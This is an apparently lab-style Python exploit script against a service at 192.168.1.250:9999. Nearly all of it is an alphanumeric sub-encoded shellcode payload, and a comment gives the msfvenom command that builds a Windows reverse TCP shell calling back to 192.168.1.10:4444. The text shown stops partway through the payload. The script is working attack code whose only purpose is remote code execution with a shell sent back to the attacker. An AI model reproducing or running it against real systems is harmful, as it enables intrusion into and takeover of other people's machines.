#!/usr/bin/python

import sys,os,struct,socket

host = '192.168.1.250'
port = 9999

# msfvenom -a x86 -p windows/shell_reverse_tcp LHOST=192.168.1.10 LPORT=4444 -f hex -b '\x00' BufferRegister=ESP
# slink.py <msfvenom payload>
exploit = "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x65\x27\x50\x50" ## add  eax, 0x50502765
exploit += "\x05\x64\x17\x40\x40" ## add  eax, 0x40401764
exploit += "\x50"                 ## push eax
# Encoding [ae46eaa8]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x54\x75\x23\x57" ## add  eax, 0x57237554
exploit += "\x05\x54\x75\x23\x57" ## add  eax, 0x57237554
exploit += "\x50"                 ## push eax
# Encoding [f9207eb7]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x64\x46\x21\x74" ## add  eax, 0x74214664
exploit += "\x05\x53\x35\x11\x64" ## add  eax, 0x64113553
exploit += "\x05\x33\x36\x21\x54" ## add  eax, 0x54213633
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [80cbb8ea]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x75\x64\x66\x40" ## add  eax, 0x40666475
exploit += "\x05\x75\x54\x65\x40" ## add  eax, 0x40655475
exploit += "\x50"                 ## push eax
# Encoding [85bea00c]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x06\x50\x67\x43" ## add  eax, 0x43675006
exploit += "\x05\x06\x50\x57\x42" ## add  eax, 0x42575006
exploit += "\x50"                 ## push eax
# Encoding [f40a23f0]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x71\x22\x15\x73" ## add  eax, 0x73152271
exploit += "\x05\x61\x12\x14\x62" ## add  eax, 0x62141261
exploit += "\x05\x51\x22\x14\x52" ## add  eax, 0x52142251
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [b6df906c]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x36\x41\x67\x63" ## add  eax, 0x63674136
exploit += "\x05\x35\x41\x66\x53" ## add  eax, 0x53664135
exploit += "\x05\x34\x41\x45\x33" ## add  eax, 0x33454134
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [e20a35e3]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x72\x23\x05\x71" ## add  eax, 0x71052372
exploit += "\x05\x71\x12\x05\x71" ## add  eax, 0x71051271
exploit += "\x50"                 ## push eax
# Encoding [43067fd3]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x62\x47\x13\x32" ## add  eax, 0x32134762
exploit += "\x05\x62\x36\x13\x22" ## add  eax, 0x22133662
exploit += "\x05\x42\x35\x13\x22" ## add  eax, 0x22133542
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [c6cb7023]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x12\x30\x66\x63" ## add  eax, 0x63663012
exploit += "\x05\x11\x40\x65\x63" ## add  eax, 0x63654011
exploit += "\x50"                 ## push eax
# Encoding [9ab277a3]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x52\x33\x61\x55" ## add  eax, 0x55613352
exploit += "\x05\x51\x44\x51\x45" ## add  eax, 0x45514451
exploit += "\x50"                 ## push eax
# Encoding [158d21ca]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x65\x11\x47\x13" ## add  eax, 0x13471165
exploit += "\x05\x65\x10\x46\x02" ## add  eax, 0x02461065
exploit += "\x50"                 ## push eax
# Encoding [a461579e]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x57\x33\x31\x52" ## add  eax, 0x52313357
exploit += "\x05\x47\x24\x30\x52" ## add  eax, 0x52302447
exploit += "\x50"                 ## push eax
# Encoding [9b1747ac]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x56\x23\x13\x56" ## add  eax, 0x56132356
exploit += "\x05\x56\x24\x04\x45" ## add  eax, 0x45042456
exploit += "\x50"                 ## push eax
# Encoding [da7f8dff]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x77\x46\x47\x65" ## add  eax, 0x65474677
exploit += "\x05\x66\x46\x36\x64" ## add  eax, 0x64364666
exploit += "\x05\x55\x34\x35\x44" ## add  eax, 0x44353455
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [03853b04]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x02\x26\x43\x02" ## add  eax, 0x02432602
exploit += "\x05\x02\x15\x42\x01" ## add  eax, 0x01421502
exploit += "\x50"                 ## push eax
# Encoding [a52b6d52]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x31\x37\x16\x53" ## add  eax, 0x53163731
exploit += "\x05\x21\x36\x15\x52" ## add  eax, 0x52153621
exploit += "\x50"                 ## push eax
# Encoding [e97f2149]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x34\x21\x47\x64" ## add  eax, 0x64472134
exploit += "\x05\x24\x12\x36\x54" ## add  eax, 0x54361224
exploit += "\x05\x24\x21\x35\x64" ## add  eax, 0x64352124
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [2f6f02ed]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x66\x12\x37\x27" ## add  eax, 0x27371266
exploit += "\x05\x56\x11\x36\x16" ## add  eax, 0x16361156
exploit += "\x05\x64\x12\x35\x25" ## add  eax, 0x25351264
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [5a6efb0c]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x16\x76\x36\x35" ## add  eax, 0x35367616
exploit += "\x05\x15\x65\x35\x34" ## add  eax, 0x34356515
exploit += "\x05\x14\x53\x36\x24" ## add  eax, 0x24365314
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [7daab048]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x24\x60\x55\x37" ## add  eax, 0x37556024
exploit += "\x05\x24\x50\x55\x46" ## add  eax, 0x46555024
exploit += "\x50"                 ## push eax
# Encoding [7fb419d1]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x61\x14\x63\x47" ## add  eax, 0x47631461
exploit += "\x05\x62\x24\x52\x36" ## add  eax, 0x36522462
exploit += "\x05\x41\x14\x32\x35" ## add  eax, 0x35321441
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [41d0c01f]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x17\x61\x61\x31" ## add  eax, 0x31616117
exploit += "\x05\x26\x51\x61\x22" ## add  eax, 0x22615126
exploit += "\x05\x15\x41\x41\x21" ## add  eax, 0x21414115
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [048757e2]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x71\x33\x43\x02" ## add  eax, 0x02433371
exploit += "\x05\x71\x24\x44\x02" ## add  eax, 0x02442471
exploit += "\x50"                 ## push eax
# Encoding [49778870]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x30\x44\x33\x25" ## add  eax, 0x25334430
exploit += "\x05\x40\x44\x44\x24" ## add  eax, 0x24444440
exploit += "\x50"                 ## push eax
# Encoding [85df126f]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x37\x12\x67\x43" ## add  eax, 0x43671237
exploit += "\x05\x36\x21\x66\x43" ## add  eax, 0x43662136
exploit += "\x05\x35\x12\x45\x32" ## add  eax, 0x32451235
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [027d479f]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x47\x34\x46\x12" ## add  eax, 0x12463447
exploit += "\x05\x46\x23\x36\x11" ## add  eax, 0x11362346
exploit += "\x05\x45\x23\x34\x12" ## add  eax, 0x12342345
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [556d2a56]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x33\x15\x37\x33" ## add  eax, 0x33371533
exploit += "\x05\x23\x15\x36\x22" ## add  eax, 0x22361523
exploit += "\x50"                 ## push eax
# Encoding [9b8885dd]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x77\x43\x44\x56" ## add  eax, 0x56444377
exploit += "\x05\x66\x42\x44\x45" ## add  eax, 0x45444266
exploit += "\x50"                 ## push eax
# Encoding [98ed0f10]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x11\x17\x66\x44" ## add  eax, 0x44661711
exploit += "\x05\x21\x16\x56\x44" ## add  eax, 0x44561621
exploit += "\x05\x11\x15\x64\x43" ## add  eax, 0x43641511
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [f9150269]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x34\x12\x13\x74" ## add  eax, 0x74131234
exploit += "\x05\x34\x11\x23\x64" ## add  eax, 0x64231134
exploit += "\x05\x34\x12\x12\x54" ## add  eax, 0x54121234
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [4cba4241]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x21\x21\x65\x26" ## add  eax, 0x26652121
exploit += "\x05\x20\x21\x55\x26" ## add  eax, 0x26552120
exploit += "\x50"                 ## push eax
# Encoding [045ccadd]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x77\x65\x36\x02" ## add  eax, 0x02366577
exploit += "\x05\x66\x65\x26\x02" ## add  eax, 0x02266566
exploit += "\x50"                 ## push eax
# Encoding [015ab734]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x23\x64\x35\x11" ## add  eax, 0x11356423
exploit += "\x05\x22\x53\x34\x12" ## add  eax, 0x12345322
exploit += "\x05\x22\x33\x24\x11" ## add  eax, 0x11243322
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [cb53dfcb]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x66\x67\x32\x66" ## add  eax, 0x66326766
exploit += "\x05\x55\x66\x32\x55" ## add  eax, 0x55326655
exploit += "\x05\x43\x45\x22\x43" ## add  eax, 0x43224543
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [18a834a2]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x51\x22\x54\x14" ## add  eax, 0x14542251
exploit += "\x05\x51\x12\x54\x04" ## add  eax, 0x04541251
exploit += "\x50"                 ## push eax
# Encoding [b287047d]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x37\x02\x43\x61" ## add  eax, 0x61430237
exploit += "\x05\x46\x02\x44\x51" ## add  eax, 0x51440246
exploit += "\x50"                 ## push eax
# Encoding [3d4d6b8d]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x47\x36\x27\x27" ## add  eax, 0x27273647
exploit += "\x05\x46\x35\x26\x16" ## add  eax, 0x16263546
exploit += "\x50"                 ## push eax
# Encoding [7c9d8bd2]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x71\x46\x57\x36" ## add  eax, 0x36574671
exploit += "\x05\x61\x45\x46\x46" ## add  eax, 0x46464561
exploit += "\x50"                 ## push eax
# Encoding [d2cd0407]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x03\x02\x67\x71" ## add  eax, 0x71670203
exploit += "\x05\x04\x02\x66\x61" ## add  eax, 0x61660204
exploit += "\x50"                 ## push eax
# Encoding [2d0d4f66]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x33\x37\x16\x26" ## add  eax, 0x26163733
exploit += "\x05\x33\x26\x16\x16" ## add  eax, 0x16162633
exploit += "\x05\x33\x25\x14\x24" ## add  eax, 0x24142533
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [84151f32]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x22\x17\x13\x43" ## add  eax, 0x43131722
exploit += "\x05\x21\x26\x23\x42" ## add  eax, 0x42232621
exploit += "\x05\x22\x15\x12\x32" ## add  eax, 0x32121522
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [3f3cde89]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x44\x66\x26\x27" ## add  eax, 0x27266644
exploit += "\x05\x44\x65\x25\x26" ## add  eax, 0x26256544
exploit += "\x05\x34\x46\x24\x25" ## add  eax, 0x25244634
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [c0a21993]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x52\x15\x51\x60" ## add  eax, 0x60511552
exploit += "\x05\x41\x04\x51\x60" ## add  eax, 0x60510441
exploit += "\x50"                 ## push eax
# Encoding [bf55bfda]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x65\x67\x33\x67" ## add  eax, 0x67336765
exploit += "\x05\x64\x56\x33\x56" ## add  eax, 0x56335664
exploit += "\x05\x44\x35\x22\x35" ## add  eax, 0x35223544
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [f2b90375]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x43\x12\x64\x72" ## add  eax, 0x72641243
exploit += "\x05\x33\x12\x54\x61" ## add  eax, 0x61541233
exploit += "\x05\x32\x12\x34\x52" ## add  eax, 0x52341232
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [c0ca73d9]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x75\x32\x65\x60" ## add  eax, 0x60653275
exploit += "\x05\x64\x41\x65\x60" ## add  eax, 0x60654164
exploit += "\x50"                 ## push eax
# Encoding [30303e14]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x12\x27\x20\x20" ## add  eax, 0x20202712
exploit += "\x05\x02\x17\x10\x10" ## add  eax, 0x10101702
exploit += "\x50"                 ## push eax
# Encoding [576903c0]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x60\x02\x35\x33" ## add  eax, 0x33350260
exploit += "\x05\x60\x01\x34\x24" ## add  eax, 0x24340160
exploit += "\x50"                 ## push eax
# Encoding [b9e2a51f]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x17\x53\x62\x64" ## add  eax, 0x64625317
exploit += "\x05\x26\x43\x51\x54" ## add  eax, 0x54514326
exploit += "\x05\x15\x42\x62\x34" ## add  eax, 0x34624215
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [d1f099a8]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x54\x44\x71\x61" ## add  eax, 0x61714454
exploit += "\x05\x44\x44\x61\x62" ## add  eax, 0x62614444
exploit += "\x05\x43\x44\x51\x41" ## add  eax, 0x41514443
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [6ba1f0ea]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x65\x71\x51\x36" ## add  eax, 0x36517165
exploit += "\x05\x54\x61\x42\x35" ## add  eax, 0x35426154
exploit += "\x05\x64\x51\x41\x33" ## add  eax, 0x33415164
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [2f65d2a8]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x54\x62\x33\x27" ## add  eax, 0x27336254
exploit += "\x05\x44\x61\x33\x16" ## add  eax, 0x16336144
exploit += "\x05\x43\x42\x32\x25" ## add  eax, 0x25324243
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [a6a1d323]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x12\x72\x51\x53" ## add  eax, 0x53517212
exploit += "\x05\x11\x61\x50\x53" ## add  eax, 0x53506111
exploit += "\x50"                 ## push eax
# Encoding [998aff9c]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x46\x77\x45\x44" ## add  eax, 0x44457746
exploit += "\x05\x45\x66\x44\x44" ## add  eax, 0x44446645
exploit += "\x05\x44\x55\x34\x44" ## add  eax, 0x44345544
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [75cc68d7]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x73\x34\x66\x33" ## add  eax, 0x33663473
exploit += "\x05\x64\x34\x66\x42" ## add  eax, 0x42663464
exploit += "\x50"                 ## push eax
# Encoding [7907edf2]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x72\x66\x14\x44" ## add  eax, 0x44146672
exploit += "\x05\x61\x56\x13\x34" ## add  eax, 0x34135661
exploit += "\x05\x52\x64\x13\x34" ## add  eax, 0x34136452
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [47db3570]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x30\x23\x76\x23" ## add  eax, 0x23762330
exploit += "\x05\x40\x12\x65\x24" ## add  eax, 0x24651240
exploit += "\x50"                 ## push eax
# Encoding [df3fbfaa]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x55\x67\x27\x67" ## add  eax, 0x67276755
exploit += "\x05\x44\x56\x26\x66" ## add  eax, 0x66265644
exploit += "\x05\x44\x35\x25\x45" ## add  eax, 0x45253544
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [9df8a417]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x14\x53\x74\x46" ## add  eax, 0x46745314
exploit += "\x05\x23\x42\x64\x46" ## add  eax, 0x46644223
exploit += "\x05\x13\x42\x53\x44" ## add  eax, 0x44534213
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [5d80d1e4]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x72\x71\x40\x37" ## add  eax, 0x37407172
exploit += "\x05\x72\x60\x40\x26" ## add  eax, 0x26406072
exploit += "\x50"                 ## push eax
# Encoding [5a478f15]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x13\x47\x34\x35" ## add  eax, 0x35344713
exploit += "\x05\x23\x46\x23\x34" ## add  eax, 0x34234623
exploit += "\x05\x12\x35\x23\x24" ## add  eax, 0x24233512
exploit += "\x2D\x33\x33\x33\x33" ## sub  eax, 0x33333333
exploit += "\x50"                 ## push eax
# Encoding [526623d4]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x72\x12\x33\x31" ## add  eax, 0x31331272
exploit += "\x05\x62\x11\x33\x21" ## add  eax, 0x21331162
exploit += "\x50"                 ## push eax
# Encoding [1bae901e]..
# No bad character found, using default encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x17\x50\x57\x16" ## add  eax, 0x16575017
exploit += "\x05\x07\x40\x57\x05" ## add  eax, 0x05574007
exploit += "\x50"                 ## push eax
# Encoding [af15c613]..
# Possible bad character found, using alterantive encoder..
exploit += "\x25\x4A\x4D\x4E\x55" ## and  eax, 0x554e4d4a
exploit += "\x25\x35\x32\x31\x2A" ## and  eax, 0x2a313235
exploit += "\x05\x12\x63\x13\x57" ## add  eax, 0x57136312
exploit += "\x05\x22\x53\x23\x46" ## add  eax, 0x46235322
